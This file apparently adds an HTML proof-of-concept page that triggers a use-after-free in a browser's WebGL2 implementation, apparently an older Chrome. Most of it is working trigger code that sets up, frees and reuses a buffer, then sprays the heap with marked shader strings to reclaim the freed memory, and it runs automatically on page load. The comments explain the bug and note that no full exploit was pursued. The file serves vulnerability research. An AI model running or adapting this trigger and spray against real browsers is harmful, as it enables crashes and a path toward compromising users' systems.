@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+        <title>POC</title>
+    </head>
+<script>
+/* Almost all of this is basic initialisation of the webgl context/environment
+ * which has nothing to do with triggering the bug or crash.
+ */
+var fragmentShader = "#version 300 es\n" +
+			   "#ifdef GL_ES\n" +
+			   "precision highp float;\n" +
+			   "precision highp int;\n" +
+			   "precision mediump sampler3D;\n" +
+			   "#endif\n" +
+			   "out vec4 outColor;\n" + 
+			   "void main( void )\n" +
+			   "{ vec4 color = vec4(0.0,0.0,0.0,1.0);\n" +
+			   "outColor = color; }";
+
+var vertexShader = "#version 300 es\n" +
+			 "layout(location = 0) in vec2 position;\n" + 
+			 "void main() { gl_Position = vec4(position.xy,0.0,1.0); }";
+
+
+
+function hex2a(hex) 
+{
+    var str = '';
+    for (var i = 0; i < hex.length; i += 2)
+        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+    return str;
+} 
+
+function init() {
+		var canvas 		= document.createElement('canvas');
+		var vs 		= null;
+		var fs 		= null;
+		var program		= null;
+		var attrib		= null;
+		var compiled 	= false;
+		var buffer		= null;
+		var other_buffer	= null;
+      
+		canvas.width 	= 320;
+      	canvas.height 	= 240;
+      	document.body.appendChild(canvas);
+		
+		gl = canvas.getContext('webgl2');
+
+
+      	if (! gl) {
+      		console.error("Couldn't start WebGL");
+			return;
+		}
+	
+
+		vs = gl.createShader(gl.VERTEX_SHADER);
+
+		gl.shaderSource(vs, vertexShader);
+		gl.compileShader(vs);
+
+		compiled = gl.getShaderParameter(vs, gl.COMPILE_STATUS);
+
+		if (! compiled) {
+			console.error('Error compiling vertex shader');
+			this.gl.deleteShader(vs);
+			return;
+		}
+
+		fs = gl.createShader(gl.FRAGMENT_SHADER);
+
+		gl.shaderSource(fs, fragmentShader);
+		gl.compileShader(fs);
+
+		compiled = gl.getShaderParameter(fs, gl.COMPILE_STATUS);
+	
+		if (! compiled) {
+			console.error('Error compiling fragment shader');
+			gl.deleteShader(fs);
+			gl.deleteShader(vs);
+			return;
+		}
+
+		program = gl.createProgram();
+		
+		gl.attachShader(program, vs);
+		gl.attachShader(program, fs);
+		gl.linkProgram(program);
+
+        	gl.useProgram(program);
+
+		/* From this point forward we're all about the bug.
+		 * First we create a buffer, bind it and enable it as 
+		 * a vertex array object. This will initialise a "slot"
+		 * with data related to this buffer that we'll make use
+		 * of later as this is the buffer that is destroyed and
+		 * used after free.
+		 */
+      	buffer = gl.createBuffer();
+      	gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+      	gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([0.0]), gl.STATIC_DRAW);
+
+		attrib = gl.getAttribLocation(program, 'position');
+        	gl.enableVertexAttribArray(attrib);
+        	gl.vertexAttribPointer(attrib, 2, this.gl.FLOAT, false, 0, 0);
+			
+		/* Now we create and bind another array which will overwrite
+		 * most of the data for the slot previously used by buffer.
+		 * The call to drawArrays() here is necessary to seed the
+		 * internal data structures with the data from the slot.
+		 * There is one important caveat, each of these attributes
+		 * have a buffer object associated with them and the buffer
+		 * object has a storage object associated with it. Because
+		 * we didn't call bufferData() we actually hit a premature 
+		 * exit in drawArrays() that results in the internal data 
+		 * structures referencing other_buffer /except/ for the 
+		 * storage element, which retains the reference back to
+		 * buffer. This is the bug-- when we deleteBuffer() the
+		 * storage elements reference becomes invalid and the data
+		 * structure refers to the valid other_buffer but has a
+		 * storage member that refers to the invalid buffer.
+		 */
+    		other_buffer = gl.createBuffer(); 
+
+    		gl.bindBuffer(gl.ARRAY_BUFFER, other_buffer); 
+    		gl.drawArrays(gl.LINES, 0, 4);
+		/* I placed the deleteBuffer() here after the allocation 
+             * of the second buffer to avoid the possibility of it 
+             * giving us the same buffer again
+             */
+    		gl.deleteBuffer(buffer); 
+		/* The next part, vertexAttribPointer() and the two
+		 * drawArrays() calls relate to triggering the bug.
+		 * It's not enough for us to have the free'd pointer, we
+		 * also need for it to be used which occurs during the 
+		 * synchronization of state in drawArrays(). The call to
+		 * vertexAttribPointer sets the state to be "dirty" and the
+		 * first call to drawArrays() sets up the state appropriately
+		 * but exits early due to having a zero sized buffer. The 
+		 * second call passes the point of early termination in the first
+		 * because the state is no longer marked as dirty and we enter into
+		 * the functionality that retrieves the buffer and dereferences the
+		 * storage element ultimately calling a vfptr for the deallocated 
+		 * object. Incidentally, the patch doesn't actually modify or change
+		 * the bug itself, but stops the expression of it by ensuring that
+		 * the zero sized buffer retains its dirty marking and thus we never
+		 * reach the triggering part and there is only one code path that 
+		 * applies :( 
+		 */
+    		gl.vertexAttribPointer(0, 4, gl.UNSIGNED_BYTE, false, 1, 255); 
+    		gl.drawArrays(gl.TRIANGLES, 0, 6);
+	
+		var unused = [];
+		/* In practice the buffer was generally reallocated to us after 3 or 4
+		 * tries. I sprayed more than necessary because sometimes it didn't
+		 */
+		for (var idx = 0; idx < 25; idx++) {
+			/* For a real exploit this method of injecting data into the GPU process
+			 * probably won't work in most contexts. While the source is not verified
+ 			 * to ensure it is valid source code it is checked to ensure that it is 
+			 * ASCII printable; this leaves tex2D() and similar functionality to inject
+			 * data in. Because newer Chrome versions use shadow stacks/CFG/etc and this
+			 * version of Chrome didn't I didn't investigate it further as it doesn't 
+			 * really teach me much of anything about successfully exploiting a current
+			 * browser
+			 */
+			unused[0] = gl.createShader(gl.VERTEX_SHADER);
+			gl.shaderSource(unused[0], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + 									"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + 
+					"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + 
+					"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + 
+					"CCCCCCCC" + 
+					"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
+					"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + 
+			 		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
+					"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+		}
+
+    		gl.drawArrays(gl.LINES, 0, 4);
+}           
+</script>
+<body onload="init();"></body>
+</html>
